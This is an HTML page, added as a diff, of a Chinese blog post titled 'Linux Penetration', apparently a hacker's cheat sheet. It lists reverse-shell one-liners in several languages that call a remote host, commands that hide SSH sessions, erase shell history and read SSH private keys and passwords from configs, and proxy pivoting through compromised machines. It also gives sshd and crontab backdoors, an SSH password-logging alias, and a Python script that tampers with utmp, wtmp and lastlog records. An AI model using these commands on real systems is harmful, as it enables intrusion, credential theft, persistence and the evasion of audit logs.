@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.26" />
+
+<link rel="canonical" href="http://caijiji.github.io/2015/11/20/linux-penetration/">
+<base href="http://caijiji.github.io/" />
+<meta property="og:title" content="Linux Penetration" />
+<meta property="og:description" content="本来是笔记本的东西 正好整理成MarkDown格式 就手抖push了一下
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://caijiji.github.io/2015/11/20/linux-penetration/" />
+
+
+
+<meta property="article:published_time" content="2015-11-20T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2015-11-20T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Linux Penetration"/>
+<meta name="twitter:description" content="本来是笔记本的东西 正好整理成MarkDown格式 就手抖push了一下
+
+"/>
+
+
+
+<meta itemprop="name" content="Linux Penetration">
+<meta itemprop="description" content="本来是笔记本的东西 正好整理成MarkDown格式 就手抖push了一下
+
+">
+
+
+<meta itemprop="dateModified" content="2015-11-20T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="847">
+
+
+
+<meta itemprop="keywords" content="Hacking," />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<link rel="stylesheet" href="css/color-dark.css" />
+
+
+
+<title>
+
+
+     Linux Penetration 
+
+</title>
+
+<script src="js/highlight.min.js"></script>
+<link rel="stylesheet" href="css/tomorrow-night.min.css" />
+<script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="http://caijiji.github.io/">菜狗小陈</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
+    
+    <a class="nav-item" href="/friend/"><div class="nav-item-title">Friend</div></a>
+    
+    <a class="nav-item" href="https://Github.com/Caijiji"><div class="nav-item-title">GitHub</div></a>
+    
+    <a class="nav-item" href="https://twitter.com/Croxy_cn"><div class="nav-item-title">Twitter</div></a>
+    
+
+  </nav>
+</div>
+
+  
+<div class="social-links-header">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> Linux Penetration </h1>
+    <div class="content"> <p>本来是笔记本的东西 正好整理成MarkDown格式 就手抖push了一下</p>
+
+<p></p>
+
+<h3 id="反弹shell">反弹Shell</h3>
+
+<p>Bash</p>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/1234 0&gt;&amp;1
+</code></pre>
+
+<p>Python</p>
+
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<p>PERL</p>
+
+<pre><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<p>PHP</p>
+
+<pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<p>Ruby</p>
+
+<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+</code></pre>
+
+<p>Java</p>
+
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre>
+
+<p>Telnet</p>
+
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
+
+python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+</code></pre>
+
+<h3 id="about-ssh">About SSH</h3>
+
+<p>w的时候看不到用户</p>
+
+<pre><code>ssh -T root@8.8.8.8 bin/sh -i
+</code></pre>
+
+<p>远程登录时防止被记录到knowhosts文件</p>
+
+<pre><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i
+</code></pre>
+
+<p>远程登录SSH后第一件事</p>
+
+<pre><code>unset HISTFILE;export HISTFILE=;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace
+</code></pre>
+
+<p>退出SSH要做的事情</p>
+
+<pre><code>rm ~/.bash_history
+history -c
+</code></pre>
+
+<p>SSH开启socks5代理</p>
+
+<p>在本地 8080 端口开 socks5 代理</p>
+
+<pre><code>ssh -fND 127.0.0.1:8080 user@127.0.0.1
+</code></pre>
+
+<p>把 socks5 代理弹到 103.224.999.999 的 2333 端口</p>
+
+<pre><code>ssh -fNR 2333:127.0.0.1:8080 forward@103.224.999.999
+</code></pre>
+
+<p>多一层中转更safe :)</p>
+
+<h2 id="about-information">About Information</h2>
+
+<h4 id="操作系统">操作系统</h4>
+
+<pre><code>cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release
+cat /etc/redhat-release
+</code></pre>
+
+<h4 id="内核版本">内核版本</h4>
+
+<pre><code>cat /proc/version   
+uname -a
+uname -mrs 
+rpm -q kernel 
+dmesg | grep Linux
+ls /boot | grep vmlinuz
+</code></pre>
+
+<h4 id="网络相关">网络相关</h4>
+
+<pre><code>/sbin/ifconfig -a
+cat /etc/network/interfaces
+cd /etc/sysconfig/network-scripts/
+ls
+netstat -ant
+arp -e
+route
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+</code></pre>
+
+<h4 id="环境变量">环境变量</h4>
+
+<pre><code>cat /etc/profile
+cat /etc/bashrc
+cat ~/.bash_profile
+cat ~/.bashrc
+cat ~/.bash_logout
+env
+set
+</code></pre>
+
+<h4 id="查看进程服务-找出root权限进程">查看进程服务 找出root权限进程 :)</h4>
+
+<pre><code>ps aux | grep root
+ps -ef | grep root
+top
+cat /etc/service
+</code></pre>
+
+<h4 id="查看计划任务">查看计划任务</h4>
+
+<pre><code>crontab -l
+crontab -e
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+</code></pre>
+
+<h3 id="history">History</h3>
+
+<pre><code>history
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+cat ~/.ssh/known_hosts
+</code></pre>
+
+<h3 id="private-key">private-key</h3>
+
+<pre><code>cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+</code></pre>
+
+<p>常见的配置文件默认地址（其实用 locate 找更方便）：</p>
+
+<pre><code>/usr/local/nginx/conf/nginx.conf
+/etc/httpd/conf/httpd.conf
+/etc/redis.conf
+/etc/rsyncd.conf
+/etc/samba/smb.conf
+/etc/my.conf
+/etc/mongodb.conf
+/etc/vsftpd/vsftpd.conf
+*/.git/config
+*/conf/svnserve.conf
+/etc/yum.repos.d/
+/etc/apt/sources.list
+</code></pre>
+
+<p>快速查看conf文件中包含password的项</p>
+
+<pre><code>find /  -name &quot;*.conf&quot; 2&gt;&amp;1 | xargs grep -s -i 'password'
+</code></pre>
+
+<h3 id="内网代理以及后门">内网代理以及后门</h3>
+
+<h4 id="内网代理">内网代理</h4>
+
+<h5 id="ssocks">ssocks</h5>
+
+<ol>
+<li>Download <a href="http://sourceforge.net/projects/ssocks/">http://sourceforge.net/projects/ssocks/</a></li>
+<li>./configure &amp;&amp; make</li>
+<li>cd src</li>
+<li>nsocks 类似通过Socks5代理后的netcat，可用来测试</li>
+</ol>
+
+<p>socks server ssocksd 用来开启Socks5代理服务
+ssocks 本地启用Socks5服务，并反弹到另一IP地址
+rcsocks 接收反弹过来的Socks5服务，并转向另一端口
+eg:在肉鸡上执行</p>
+
+<pre><code>./rssocks -vv -s vpsip:1081
+</code></pre>
+
+<p>在vps上执行</p>
+
+<pre><code>./rcsocks -l 1088 -p 1081 -vv
+</code></pre>
+
+<p>链接成功后 本机使用proxychains代理vpsip和端口即可</p>
+
+<h5 id="regeorg">reGeorg</h5>
+
+<ol>
+<li>Download <a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li>
+
+<li><p>把相对应的shell传到网站上.</p>
+
+<p>python reGeorgSocksProxy.py -p 8080 -u <a href="http://upload.sensepost.net:8080/tunnel/tunnel.jsp">http://upload.sensepost.net:8080/tunnel/tunnel.jsp</a></p></li>
+</ol>
+
+<h4 id="reprocks">reprocks</h4>
+
+<ol>
+<li>Download <a href="https://github.com/RicterZ/reprocks">https://github.com/RicterZ/reprocks</a></li>
+</ol>
+
+<p>vps执行：server.py 8888 9999</p>
+
+<p>肉鸡执行：client.py -m 1 vpsIP 8888  #这样就把socks5代理服务转出来了</p>
+
+<p>然后本机用vps的9999端口进行代理</p>
+
+<p>肉鸡执行：client.py -m 2 内网IP 内网端口 vpsIP 8888  #这样就把内网别的端口服务转出来了</p>
+
+<p>肉鸡执行：client.py -m 3 7070 这样就只是在肉鸡上监听7070端口开启socks5代理服务</p>
+
+<h4 id="backdoor">BackDoor</h4>
+
+<p>Openssh BackDoor</p>
+
+<p>会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。</p>
+
+<pre><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337; 
+</code></pre>
+
+<p>一个后门</p>
+
+<pre><code>cd /usr/sbin
+mv sshd ../bin
+echo '#!/usr/bin/perl' &gt;sshd
+echo 'exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd
+echo 'exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,' &gt;&gt;sshd
+chmod u+x sshd 
+/etc/init.d/sshd restart
+</code></pre>
+
+<p>之后本机执行</p>
+
+<pre><code>socat STDIO TCP4:10.18.180.20:22,sourceport=13377 
+</code></pre>
+
+<p>记录ssh密码</p>
+
+<pre><code>alias ssh='strace -o /tmp/.sshpwd-`date '+%d%h%m%s'`.log -e read.write.connect -s 2048 ssh' 
+</code></pre>
+
+<p>Crontab后门</p>
+
+<pre><code>(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/103.224.81.999/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -
+</code></pre>
+
+<h3 id="unix-tips">unix tips</h3>
+
+<p>unix自带了wtmp格式转换工具因此无需写程序条一命令即可修改last日志。</p>
+
+<pre><code>/usr/lib/acct/fwtmp &lt; /var/adm/wtmpx | sed &quot;s/192.168.8.88/localhost/g&quot; | /usr/lib/acct/fwtmp -ic &gt; /var/adm/wtmpx
+</code></pre>
+
+<p>原理是先用fwtmp将wtmpx文件转换成ascii格式再用sed将登陆IP:192.168.8.88替换成localhost，(删除指定IP修改sed处)最后再用fwtmp转换成二进制格式覆盖回去。</p>
+
+<p>同样也可以用于隐藏登陆用户</p>
+
+<pre><code>/usr/lib/acct/fwtmp &lt; /var/adm/utmpx | sed &quot;/admin/d&quot; | /usr/lib/acct/fwtmp -ic &gt; /var/adm/utmpx
+</code></pre>
+
+<p>这样使用w命令就看不到admin用户了</p>
+
+<h3 id="痕迹清理">痕迹清理</h3>
+
+<p>touch -r
+shred删日志比rm安全:)</p>
+
+<pre><code>#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+# mail: cn.b4dboy@gmail.com
+
+import os, struct, sys
+from pwd import getpwnam
+from time import strptime, mktime
+from optparse import OptionParser
+UTMPFILE = &quot;/var/run/utmp&quot;
+WTMPFILE = &quot;/var/log/wtmp&quot;
+LASTLOGFILE = &quot;/var/log/lastlog&quot;
+LAST_STRUCT = 'I32s256s'
+LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)
+XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
+XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
+def getXtmp(filename, username, hostname):
+    xtmp = ''
+    try:
+        fp = open(filename, 'rb')
+        while True:
+            bytes = fp.read(XTMP_STRUCT_SIZE)
+            if not bytes:
+                break
+            data = struct.unpack(XTMP_STRUCT, bytes)
+            record = [(lambda s: str(s).split(&quot;\0&quot;, 1)[0])(i) for i in data]
+            if (record[4] == username and record[5] == hostname):
+                continue
+            xtmp += bytes
+    except:
+        showMessage('Cannot open file: %s' % filename)
+    finally:
+        fp.close()
+    return xtmp
+def modifyLast(filename, username, hostname, ttyname, strtime):
+    try:
+        p = getpwnam(username)
+    except:
+        showMessage('No such user.')
+    timestamp = 0
+    try:
+        str2time = strptime(strtime, '%Y:%m:%d:%H:%M:%S')
+        timestamp = int(mktime(str2time))
+    except:
+        showMessage('Time format err.')
+    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)
+    try:
+        fp = open(filename, 'wb')
+        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)
+        fp.write(data)
+    except:
+        showMessage('Cannot open file: %s' % filename)
+    finally:
+        fp.close()
+    return True
+
+def showMessage(msg):
+    print msg
+    exit(-1)
+
+def saveFile(filename, contents):
+    try:
+        fp = open(filename, 'w+b')
+        fp.write(contents)
+    except IOError as e:
+        showMessage(e)
+    finally:
+        fp.close()
+
+if __name__ == '__main__':
+    usage = 'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \
+        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'
+    parser = OptionParser(usage=usage)
+    parser.add_option('-m', '--mode', dest='MODE', default='1' , help='1: utmp, 2: wtmp, 3: lastlog [default: 1]')
+    parser.add_option('-t', '--ttyname', dest='TTYNAME')
+    parser.add_option('-f', '--filename', dest='FILENAME')
+    parser.add_option('-u', '--username', dest='USERNAME')
+    parser.add_option('-i', '--hostname', dest='HOSTNAME')
+    parser.add_option('-d', '--dateline', dest='DATELINE')
+    (options, args) = parser.parse_args()
+    if len(args) &lt; 3:
+        if options.MODE == '1':
+            if options.USERNAME == None or options.HOSTNAME == None:
+                showMessage('+[Warning]: Incorrect parameter.\n')
+            if options.FILENAME == None:
+                options.FILENAME = UTMPFILE
+            # tamper
+            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
+            saveFile(options.FILENAME, newData)
+        elif options.MODE == '2':
+            if options.USERNAME == None or options.HOSTNAME == None:
+                showMessage('+[Warning]: Incorrect parameter.\n')
+            if options.FILENAME == None:
+                options.FILENAME = WTMPFILE
+            # tamper
+            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)
+            saveFile(options.FILENAME, newData)
+        elif options.MODE == '3':
+            if options.USERNAME == None or options.HOSTNAME == None or options.TTYNAME == None or options.DATELINE == None:
+                showMessage('+[Warning]: Incorrect parameter.\n')
+            if options.FILENAME == None:
+                options.FILENAME = LASTLOGFILE
+            # tamper
+            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)
+        else:
+            parser.print_help()
+</code></pre> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+      <div class="tag">
+        <a href="/tags/hacking">#Hacking</a>
+      </div>
+    
+</div>
+
+    <div class="date"> Nov 20, 2015 </div>
+  </div>
+
+</footer>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Croxy';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>
+  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <div class="social-link">
+  <a href="http://caijiji.github.io/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright">  </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</body>
+</html>
+
